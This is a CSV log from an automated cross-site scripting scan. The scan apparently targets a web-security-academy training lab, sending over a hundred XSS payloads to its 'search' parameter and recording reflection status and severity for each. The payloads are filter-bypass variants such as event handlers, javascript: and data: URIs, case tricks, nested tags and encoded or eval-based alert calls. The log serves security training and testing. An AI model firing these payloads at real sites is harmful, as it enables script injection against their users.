Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:00:40.517,2026-01-10 16:00:40.838,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:40.838,2026-01-10 16:00:41.161,0.323,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:41.161,2026-01-10 16:00:41.379,0.218,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:41.379,2026-01-10 16:00:41.611,0.232,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:41.611,2026-01-10 16:00:41.804,0.192,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:41.804,2026-01-10 16:00:42.121,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:42.121,2026-01-10 16:00:42.438,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:42.438,2026-01-10 16:00:42.758,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:42.758,2026-01-10 16:00:43.078,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:43.078,2026-01-10 16:00:43.397,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:43.397,2026-01-10 16:00:43.718,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:43.718,2026-01-10 16:00:44.037,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:44.037,2026-01-10 16:00:44.280,0.243,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmove=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:44.280,2026-01-10 16:00:44.473,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:44.473,2026-01-10 16:00:44.693,0.220,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:44.693,2026-01-10 16:00:44.921,0.228,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onpaste=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:44.921,2026-01-10 16:00:45.156,0.235,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:45.156,2026-01-10 16:00:45.363,0.207,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:45.363,2026-01-10 16:00:45.603,0.240,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onreset=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:45.603,2026-01-10 16:00:45.796,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onresize=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:45.796,2026-01-10 16:00:45.983,0.187,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:45.983,2026-01-10 16:00:46.278,0.295,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:46.278,2026-01-10 16:00:46.598,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:46.598,2026-01-10 16:00:46.917,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:46.917,2026-01-10 16:00:47.237,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:47.237,2026-01-10 16:00:47.420,0.183,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:47.420,2026-01-10 16:00:47.612,0.192,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onscroll=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:47.612,2026-01-10 16:00:47.877,0.265,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onselect=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:47.877,2026-01-10 16:00:48.049,0.172,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:48.049,2026-01-10 16:00:48.215,0.166,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:48.215,2026-01-10 16:00:48.517,0.302,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:48.517,2026-01-10 16:00:48.679,0.163,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onstop=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:48.679,2026-01-10 16:00:48.843,0.164,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:48.843,2026-01-10 16:00:49.008,0.165,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onunload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:49.008,2026-01-10 16:00:49.181,0.173,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,javascript:alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:49.181,2026-01-10 16:00:49.477,0.296,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,javascript:alert('XSS'),RAW_REFLECTION,No,,High
2026-01-10 16:00:49.477,2026-01-10 16:00:49.648,0.171,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,javascript:prompt(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:49.648,2026-01-10 16:00:49.957,0.308,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,javascript:confirm(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:49.957,2026-01-10 16:00:50.274,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:00:50.274,2026-01-10 16:00:50.488,0.214,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:00:50.488,2026-01-10 16:00:50.756,0.269,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/oncut=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:50.756,2026-01-10 16:00:51.074,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:51.074,2026-01-10 16:00:51.397,0.323,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/ondrag=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:51.397,2026-01-10 16:00:51.606,0.209,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/ondrop=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:51.606,2026-01-10 16:00:51.808,0.202,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:51.808,2026-01-10 16:00:52.035,0.227,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:52.035,2026-01-10 16:00:52.355,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/oninput=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:52.355,2026-01-10 16:00:52.554,0.200,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:52.554,2026-01-10 16:00:52.835,0.281,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onmove=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:52.835,2026-01-10 16:00:53.154,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onpaste=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:53.154,2026-01-10 16:00:53.376,0.222,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onreset=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:53.376,2026-01-10 16:00:53.634,0.258,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onresize=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:53.634,2026-01-10 16:00:53.954,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onscroll=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:53.954,2026-01-10 16:00:54.174,0.220,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onselect=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:54.174,2026-01-10 16:00:54.434,0.260,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:54.434,2026-01-10 16:00:54.754,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onstop=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:54.754,2026-01-10 16:00:55.075,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<q/onsubmit=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:55.075,2026-01-10 16:00:55.272,0.197,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:55.272,2026-01-10 16:00:55.464,0.192,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:55.464,2026-01-10 16:00:55.714,0.250,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:55.714,2026-01-10 16:00:56.035,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body onload=alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:56.035,2026-01-10 16:00:56.354,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>,RAW_REFLECTION,No,,High
2026-01-10 16:00:56.354,2026-01-10 16:00:56.675,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,alert(1),RAW_REFLECTION,No,,High
2026-01-10 16:00:56.675,2026-01-10 16:00:56.986,0.311,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,</script>,ESCAPED,No,,Low
2026-01-10 16:00:56.986,2026-01-10 16:00:57.192,0.207,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:57.192,2026-01-10 16:00:57.473,0.281,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg,RAW_REFLECTION,No,,High
2026-01-10 16:00:57.473,2026-01-10 16:00:57.795,0.322,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:57.795,2026-01-10 16:00:58.114,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,No,,High
2026-01-10 16:00:58.114,2026-01-10 16:00:58.434,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,No,,High
2026-01-10 16:00:58.434,2026-01-10 16:00:58.755,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,No,,High
2026-01-10 16:00:58.755,2026-01-10 16:00:58.913,0.158,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:58.913,2026-01-10 16:00:59.073,0.160,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:59.073,2026-01-10 16:00:59.243,0.171,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:59.243,2026-01-10 16:00:59.411,0.168,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:00:59.411,2026-01-10 16:00:59.714,0.303,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,< script >alert(1)< / script >,RAW_REFLECTION,No,,High
2026-01-10 16:00:59.714,2026-01-10 16:00:59.891,0.177,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,< img src=x onerror=alert(1) >,RAW_REFLECTION,No,,High
2026-01-10 16:00:59.892,2026-01-10 16:01:00.193,0.301,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,< svg onload=alert(1) >,RAW_REFLECTION,No,,High
2026-01-10 16:01:00.193,2026-01-10 16:01:00.514,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,No,,High
2026-01-10 16:01:00.514,2026-01-10 16:01:00.709,0.195,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:00.709,2026-01-10 16:01:00.994,0.285,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:01:00.994,2026-01-10 16:01:01.314,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:01.314,2026-01-10 16:01:01.634,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg//onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:01.634,2026-01-10 16:01:01.954,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,No,,High
2026-01-10 16:01:01.954,2026-01-10 16:01:02.272,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,No,,High
2026-01-10 16:01:02.272,2026-01-10 16:01:02.475,0.202,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,No,,High
2026-01-10 16:01:02.475,2026-01-10 16:01:02.758,0.283,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert`1`</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:02.758,2026-01-10 16:01:03.073,0.315,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,No,,High
2026-01-10 16:01:03.073,2026-01-10 16:01:03.393,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,No,,High
2026-01-10 16:01:03.393,2026-01-10 16:01:03.717,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:03.717,2026-01-10 16:01:04.032,0.315,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:04.032,2026-01-10 16:01:04.284,0.251,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:04.284,2026-01-10 16:01:04.485,0.201,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval('alert(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:04.485,2026-01-10 16:01:04.679,0.194,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:04.679,2026-01-10 16:01:04.950,0.271,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:04.950,2026-01-10 16:01:05.161,0.211,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,No,,High
2026-01-10 16:01:05.161,2026-01-10 16:01:05.473,0.312,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=eval('alert(1)')>,RAW_REFLECTION,No,,High
2026-01-10 16:01:05.473,2026-01-10 16:01:05.720,0.247,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>Function('alert(1)')()</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:05.720,2026-01-10 16:01:05.922,0.202,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:05.922,2026-01-10 16:01:06.111,0.189,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,No,,High
2026-01-10 16:01:06.111,2026-01-10 16:01:06.433,0.322,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:06.434,2026-01-10 16:01:06.751,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:06.751,2026-01-10 16:01:07.072,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:07.072,2026-01-10 16:01:07.309,0.237,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,No,,High
2026-01-10 16:01:07.309,2026-01-10 16:01:07.551,0.242,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:07.551,2026-01-10 16:01:07.758,0.207,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:07.758,2026-01-10 16:01:08.031,0.273,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:08.031,2026-01-10 16:01:08.231,0.200,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:08.232,2026-01-10 16:01:08.511,0.280,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:08.511,2026-01-10 16:01:08.832,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:08.832,2026-01-10 16:01:09.151,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:09.151,2026-01-10 16:01:09.472,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:09.472,2026-01-10 16:01:09.792,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:09.792,2026-01-10 16:01:09.963,0.171,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:09.963,2026-01-10 16:01:10.148,0.184,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:10.148,2026-01-10 16:01:10.432,0.284,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:10.432,2026-01-10 16:01:10.751,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:10.752,2026-01-10 16:01:11.003,0.252,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:11.003,2026-01-10 16:01:11.231,0.227,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,No,,High
2026-01-10 16:01:11.231,2026-01-10 16:01:11.551,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:11.551,2026-01-10 16:01:11.872,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:11.872,2026-01-10 16:01:12.191,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:12.191,2026-01-10 16:01:12.433,0.241,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,No,,High
2026-01-10 16:01:12.433,2026-01-10 16:01:12.670,0.238,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,No,,High
2026-01-10 16:01:12.670,2026-01-10 16:01:12.992,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,No,,High
2026-01-10 16:01:12.992,2026-01-10 16:01:13.313,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<base href=javascript:alert(1)//>,RAW_REFLECTION,No,,High
2026-01-10 16:01:13.313,2026-01-10 16:01:13.553,0.240,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:13.553,2026-01-10 16:01:13.814,0.262,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,No,,High
